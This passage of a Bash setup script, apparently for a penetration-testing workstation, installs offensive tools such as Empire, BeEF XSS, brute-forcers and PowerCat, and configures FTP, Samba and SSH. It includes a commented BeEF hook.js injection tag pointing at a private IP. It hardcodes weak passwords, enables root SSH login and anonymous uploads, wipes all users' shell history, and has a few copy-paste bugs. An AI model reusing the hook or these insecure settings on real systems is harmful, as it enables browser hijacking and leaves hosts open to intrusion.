git clone -q https://github.com/PowerShellEmpire/Empire.git /opt/empire-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install wig
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}wig${RESET} ~ web application detection"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/jekyc/wig.git /opt/wig-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/wig-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/wig-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/wig-git/ && python3 wig.py "\$@"
EOF
chmod +x "${file}"


##### Install CMSmap
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}CMSmap${RESET} ~ CMS detection"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/Dionach/CMSmap.git /opt/cmsmap-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/cmsmap-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/cmsmap-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/cmsmap-git/ && python3 cmsmap.py "\$@"
EOF
chmod +x "${file}"

##### Install droopescan
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}DroopeScan${RESET} ~ Drupal vulnerability scanner"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/droope/droopescan.git /opt/droopescan-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/droopescan-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/droopescan-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/droopescan-git/ && python3 droopescan "\$@"
EOF
chmod +x "${file}"


##### Install wpscan (GIT)
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}WPScan${RESET} (GIT) ~ WordPress vulnerability scanner"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/wpscanteam/wpscan.git /opt/wpscan-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/wpscan-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/wpscan-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/wpscan-git/ && ruby wpscan.rb "\$@"
EOF
chmod +x "${file}"


##### Install BeEF XSS
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}BeEF XSS${RESET} ~ XSS framework"
apt -y -qq install beef-xss \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
#--- Configure beef
file=/usr/share/beef-xss/config.yaml; [ -e "${file}" ] && cp -n $file{,.bkup}
username="root"
password="toor"
sed -i 's/user:.*".*"/user:   "'${username}'"/' "${file}"
sed -i 's/passwd:.*".*"/passwd:  "'${password}'"/'  "${file}"
echo -e " ${YELLOW}[i]${RESET} BeEF username: ${username}"
echo -e " ${YELLOW}[i]${RESET} BeEF password: ${password}   ***${BOLD}CHANGE THIS ASAP${RESET}***"
echo -e " ${YELLOW}[i]${RESET} Edit: /usr/share/beef-xss/config.yaml"
#--- Example
#<script src="http://192.168.155.175:3000/hook.js" type="text/javascript"></script>


##### Install patator (GIT)
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}patator${RESET} (GIT) ~ brute force"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/lanjelot/patator.git /opt/patator-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/patator-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/patator-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/patator-git/ && python3 patator.py "\$@"
EOF
chmod +x "${file}"


##### Install crowbar
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}crowbar${RESET} ~ brute force"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/galkan/crowbar.git /opt/crowbar-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/crowbar-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/crowbar-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/crowbar-git/ && python3 crowbar.py "\$@"
EOF
chmod +x "${file}"

##### Install ADenum
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}ADenum${RESET} ~ brute force"
apt -y -qq install libsasl2-dev python-dev libldap2-dev libssl-dev
git clone https://github.com/SecureAuthCorp/impacket /opt/impacket-git || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/impacket-git/ >/dev/null
git pull -q
popd >/dev/null
python3 -m pip install /opt/impacket-git/.
python -m pip install /opt/impacket-git/.
git clone https://github.com/SecuProject/ADenum.git /opt/ADenum-git|| echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pip3 install -r /opt/ADenum-git/requirements.txt
pushd /opt/ADenum-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/crowbar-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/ADenum-git/ && python3 ADenum.py "\$@"
EOF
chmod +x "${file}"

##### Install xprobe
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}xprobe${RESET} ~ os fingerprinting"
apt install -y -qq xprobe || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install p0f
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}p0f${RESET} ~ os fingerprinting"
apt install -y -qq p0f || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#p0f -i eth0 -p & curl 192.168.0.1


##### Setup tftp client & server
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Setting up ${GREEN}tftp client${RESET} & ${GREEN}server${RESET} ~ file transfer methods"
apt -y -qq install tftp   || echo -e ' '${RED}'[!] Issue with apt'${RESET}   # tftp client
apt -y -qq install atftpd || echo -e ' '${RED}'[!] Issue with apt'${RESET}   # tftp server
#--- Configure atftpd
file=/etc/default/atftpd; [ -e "${file}" ] && cp -n $file{,.bkup}
echo -e 'USE_INETD=false\nOPTIONS="--tftpd-timeout 300 --retry-timeout 5 --maxthread 100 --verbose=5 --daemon --port 69 /var/tftp"' > "${file}"
mkdir -p /var/tftp/
chown -R nobody\:root /var/tftp/
chmod -R 0755 /var/tftp/
#--- Setup alias
file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^## tftp' "${file}" 2>/dev/null || echo -e '## tftp\nalias tftproot="cd /var/tftp/"\n' >> "${file}"                                        # systemctl atftpd start
#--- Remove from start up
systemctl disable atftpd
#--- Disabling IPv6 can help
#echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
#echo 1 > /proc/sys/net/ipv6/conf/default/disable_ipv6


##### Install Pure-FTPd
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}Pure-FTPd${RESET} ~ FTP server/file transfer method"
apt -y -qq install pure-ftpd || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Setup pure-ftpd
mkdir -p /var/ftp/
groupdel ftpgroup 2>/dev/null; groupadd ftpgroup
userdel ftp 2>/dev/null; useradd -r -M -d /var/ftp/ -s /bin/false -c "FTP user" -g ftpgroup ftp
chown -R ftp\:ftpgroup /var/ftp/
chmod -R 0755 /var/ftp/
pure-pw userdel ftp 2>/dev/null; echo -e '\n' | pure-pw useradd ftp -u ftp -d /var/ftp/
pure-pw mkdb
#--- Configure pure-ftpd
echo "no" > /etc/pure-ftpd/conf/UnixAuthentication
echo "no" > /etc/pure-ftpd/conf/PAMAuthentication
echo "yes" > /etc/pure-ftpd/conf/NoChmod
echo "yes" > /etc/pure-ftpd/conf/ChrootEveryone
#echo "yes" > /etc/pure-ftpd/conf/AnonymousOnly
echo "no" > /etc/pure-ftpd/conf/NoAnonymous
echo "yes" > /etc/pure-ftpd/conf/AnonymousCanCreateDirs
echo "yes" > /etc/pure-ftpd/conf/AllowAnonymousFXP
echo "no" > /etc/pure-ftpd/conf/AnonymousCantUpload
echo "30768 31768" > /etc/pure-ftpd/conf/PassivePortRange             #cat /proc/sys/net/ipv4/ip_local_port_range
echo "/etc/pure-ftpd/welcome.msg" > /etc/pure-ftpd/conf/FortunesFile  #/etc/motd
echo "FTP" > /etc/pure-ftpd/welcome.msg
#--- 'Better' MOTD
apt install -y -qq cowsay || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
echo "Moo" | /usr/games/cowsay > /etc/pure-ftpd/welcome.msg
#--- SSL
#mkdir -p /etc/ssl/private/
#openssl req -x509 -nodes -newkey rsa:4096 -keyout /etc/ssl/private/pure-ftpd.pem -out /etc/ssl/private/pure-ftpd.pem
#chmod -f 0600 /etc/ssl/private/*.pem
ln -sf /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/50pure
#--- Apply settings
#systemctl restart pure-ftpd
echo -e " ${YELLOW}[i]${RESET} Pure-FTPd username: anonymous"
echo -e " ${YELLOW}[i]${RESET} Pure-FTPd password: anonymous"
#--- Setup alias
file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^## ftp' "${file}" 2>/dev/null || echo -e '## ftp\nalias ftproot="cd /var/ftp/"\n' >> "${file}"                                            # systemctl pure-ftpd start
#--- Remove from start up
systemctl disable pure-ftpd


##### Install samba
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}samba${RESET} ~ file transfer method"
#--- Installing samba
apt -y -qq install samba || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
apt -y -qq install cifs-utils || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Create samba user
groupdel smbgroup 2>/dev/null; groupadd smbgroup
userdel samba 2>/dev/null; useradd -r -M -d /nonexistent -s /bin/false -c "Samba user" -g smbgroup samba
#--- Use the samba user
file=/etc/samba/smb.conf; [ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/guest account = .*/guest account = samba/' "${file}" 2>/dev/null
grep -q 'guest account' "${file}" 2>/dev/null || sed -i 's#\[global\]#\[global\]\n   guest account = samba#' "${file}"
#--- Setup samba paths
grep -q '^\[shared\]' "${file}" 2>/dev/null || cat <<EOF >> "${file}"
[shared]
  comment = Shared
  path = /var/samba/
  browseable = yes
  guest ok = yes
  #guest only = yes
  read only = no
  writable = yes
  create mask = 0644
  directory mask = 0755
EOF
#--- Create samba path and configure it
mkdir -p /var/samba/
chown -R samba\:smbgroup /var/samba/
chmod -R 0755 /var/samba/   #chmod 0777 /var/samba/
#--- Bug fix
touch /etc/printcap
#--- Check result
#systemctl restart samba
#smbclient -L \\127.0.0.1 -N
#mount -t cifs -o guest //192.168.1.2/share /mnt/smb     mkdir -p /mnt/smb
#--- Disable samba at startup
systemctl stop samba
systemctl disable samba
echo -e " ${YELLOW}[i]${RESET} Samba username: guest"
echo -e " ${YELLOW}[i]${RESET} Samba password: <blank>"
#--- Setup alias
file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^## smb' "${file}" 2>/dev/null || echo -e '## smb\nalias sambaroot="cd /var/samba/"\n#alias smbroot="cd /var/samba/"\n' >> "${file}"
#---ZSH_aliases


#--- Functions


##### Install apache2 & php7
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}apache2${RESET} & ${GREEN}php5${RESET} ~ web server"
apt -y -qq install apache2
touch /var/www/html/favicon.ico
if [[ -e /var/www/html/index.html ]]; then
  grep -q '<title>Apache2 Debian Default Page: It works</title>' /var/www/html/index.html && rm -f /var/www/html/index.html && echo '<?php echo "Access denied for " . $_SERVER["REMOTE_ADDR"]; ?>' > /var/www/html/index.php
fi
#sed -i 's/^display_errors = .*/display_errors = on/' /etc/php5/apache2/php.ini
#--- Setup alias
file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^## www' "${file}" 2>/dev/null || echo -e '## www\nalias wwwroot="cd /var/www/html/"\n' >> "${file}"                                            # systemctl apache2 start
#--- php fu
apt -y -qq install php7.4 php7.4-cli php7.4-curl


##### Install mysql
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}MySQL${RESET} ~ database"
apt -y -qq install mysql-server
echo -e " ${YELLOW}[i]${RESET} MySQL username: root"
echo -e " ${YELLOW}[i]${RESET} MySQL password: <blank>   ***${BOLD}CHANGE THIS ASAP${RESET}***"
if [[ ! -e ~/.my.cnf ]]; then
  cat <<EOF > ~/.my.cnf
[client]
user=root
host=localhost
password=
EOF
fi

##### Install rsh-client
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}rsh-client${RESET} ~ remote shell connections"
apt -y -qq install rsh-client || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


#-- deps
apt -y - qq install libssl-dev || echo -e ' '${RED}'[!] Issue with apt libssl-dev '${RESET} 1>&2

##### Install sshpass
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}sshpass${RESET} ~ automating SSH connections"
apt -y -qq install sshpass || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install rdesktop
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}rdesktop${RESET} ~ connecting to remote windows"
apt -y -qq install rdesktop || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install ashttp
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}ashttp${RESET} ~ Share your terminal via the web"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/JulienPalard/ashttp.git /opt/ashttp-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install gotty
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}gotty${RESET} ~ Share your terminal via the web"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/yudai/gotty.git /opt/gotty-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2

##### Preparing a jail ~ http://allanfeid.com/content/creating-chroot-jail-ssh-access // http://www.cyberciti.biz/files/lighttpd/l2chroot.txt
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Preparing up a ${GREEN}jail${RESET} ~ testing environment"
apt -y -qq install debootstrap curl \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2

##### Setup SSH
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Setting up ${GREEN}SSH${RESET} ~ CLI access"
apt -y -qq install openssh-server || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Wipe current keys
rm -f /etc/ssh/ssh_host_*
find ~/.ssh/ -type f ! -name authorized_keys -delete 2>/dev/null   #rm -f "~/.ssh/!(authorized_keys)" 2>/dev/null
#--- Generate new keys
#ssh-keygen -A   # Automatic method - we lose control of amount of bits used
ssh-keygen -b 4096 -t rsa1 -f /etc/ssh/ssh_host_key -P "kingezz49"
ssh-keygen -b 4096 -t rsa -f /etc/ssh/ssh_host_rsa_key -P "kingezz49"
ssh-keygen -b 1024 -t dsa -f /etc/ssh/ssh_host_dsa_key -P "kingezz49"
ssh-keygen -b 521 -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key -P "kingezz49"
ssh-keygen -b 4096 -t rsa -f ~/.ssh/id_rsa -P "kingezz49"

#--- Change SSH settings
file=/etc/ssh/sshd_config; [ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/^PermitRootLogin .*/PermitRootLogin yes/g' "${file}"      # Accept password login (overwrite Debian 8's more secuire default option...)
sed -i 's/^#AuthorizedKeysFile /AuthorizedKeysFile /g' "${file}"    # Allow for key based login
#sed -i 's/^Port .*/Port 2222/g' "${file}"
#--- Enable ssh at startup
systemctl enable ssh
#--- Setup alias (handy for 'zsh: correct 'ssh' to '.ssh' [nyae]? n')
file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^## ssh' "${file}" 2>/dev/null || echo -e '## ssh\nalias ssh-start="systemctl restart ssh"\nalias ssh-stop="systemctl stop ssh"\n' >> "${file}"

############ Pip Install ############
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) ${GREEN}PIP${RESET} Installs"
pip install glances maybe whatportis yapf thefuck tmux2html webkit2png|| echo -e ' '${RED}'[!] Issue with pip'${RESET} 1>&2
pip install https://github.com/guelfoweb/knock/archive/knock3.zip|| echo -e ' '${RED}'[!] Issue with pip'${RESET} 1>&2

##### Custom insert point

#---Github add Temp
#echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN} -InsertName-${RESET} ~ -About-"
#apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#git clone -q -GithubAddress- /opt/*FileName* -git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
# pushd /opt/*FileName* -git/ >/dev/null
#git pull -q
#popd >/dev/null
#--- Add to path
#file=/usr/local/bin/*FileName* -git
#cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
##!/bin/bash
#cd /opt/*FileName* -git/ && python3 *file* "\$@"
#EOF
#chmod +x "${file}"

(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}Windows Exploit Suggester${RESET} ~ A Windows Exploit Suggester"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/GDSSecurity/Windows-Exploit-Suggester.git /opt/Windows-Exploit-Suggester-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/Windows-Exploit-Suggester-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/Windows-Exploit-Suggester-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/Windows-Exploit-Suggester-git/ && python3 windows-exploit-suggester.py "\$@"
EOF
chmod +x "${file}"

(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}PowerCat${RESET} ~ Netcat for Powershell "
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/secabstraction/PowerCat.git /opt/powercat-git/ || echo -e ' '${RED}'[!] Issue when git cloning powercat'${RESET} 1>&2

(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) ${GREEN}xsetting${RESET} no screensaver"
xset -dpms
xset s noblank
xset s off

##### Clean the system
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) ${GREEN}Cleaning${RESET} the system"
#--- Clean package manager
for FILE in clean autoremove; do apt -y -qq "${FILE}"; done         # Clean up - clean remove autoremove autoclean
apt -y -qq purge $(dpkg -l | tail -n +6 | egrep -v '^(h|i)i' | awk '{print $2}')   # Purged packages
#--- Update slocate database
updatedb
#--- Reset folder location
cd ~/ &>/dev/null
#--- Remove any history files (as they could contain sensitive info)
[[ "${SHELL}" == "/bin/zsh" ]] || history -c
for i in $(cut -d: -f6 /etc/passwd | sort -u); do
  [ -e "${i}" ] && find "${i}" -type f -name '.*_history' -delete
done

if [ "${freezeDEB}" != "false" ]; then
  ##### Don't ever update these packages (during this install!)
  echo -e "\n ${GREEN}[+]${RESET} ${GREEN}Don't upgrade${RESET} these packages:"
  for x in metasploit-framework; do
    echo -e " ${YELLOW}[i]${RESET} + ${x}"
    echo "${x} install" | dpkg --set-selections
  done
fi


##### Time taken
finish_time=$(date +%s)
echo -e "\n ${YELLOW}[i]${RESET} Time (roughly) taken: ${YELLOW}$(( $(( finish_time - start_time )) / 60 )) minutes${RESET}"


#-Done-----------------------------------------------------------------#


##### Done!
echo -e "\n ${YELLOW}[i]${RESET} Don't forget to:"
echo -e " ${YELLOW}[i]${RESET} + Check the above output (Did everything install? Any errors? (${RED}HINT: What's in RED${RESET}?)"
echo -e " ${YELLOW}[i]${RESET} + Manually install: Nessus, Nexpose, and/or Metasploit Community"
echo -e " ${YELLOW}[i]${RESET} + Agree/Accept to: Maltego, OWASP ZAP, w3af, etc"
echo -e " ${YELLOW}[i]${RESET} + Setup git:   git config --global user.name <name>;git config --global user.email <email>"
#echo -e " ${YELLOW}[i]${RESET} + ${YELLOW}Change time zone${RESET} & ${YELLOW}keyboard layout${RESET} (...if not ${BOLD}${timezone}${RESET} & ${BOLD}${keyboardLayout}${RESET})"
echo -e " ${YELLOW}[i]${RESET} + ${YELLOW}Change default passwords${RESET}: PostgreSQL/MSF, MySQL, OpenVAS, BeEF XSS, etc"
echo -e " ${YELLOW}[i]${RESET} + ${YELLOW}Reboot${RESET}"
(dmidecode | grep -iq virtual) && echo -e " ${YELLOW}[i]${RESET} + Take a snapshot   (Virtual machine detected!)"

echo -e '\n'${BLUE}'[*]'${RESET}' '${BOLD}'Done!'${RESET}'\n\a'
exit 0
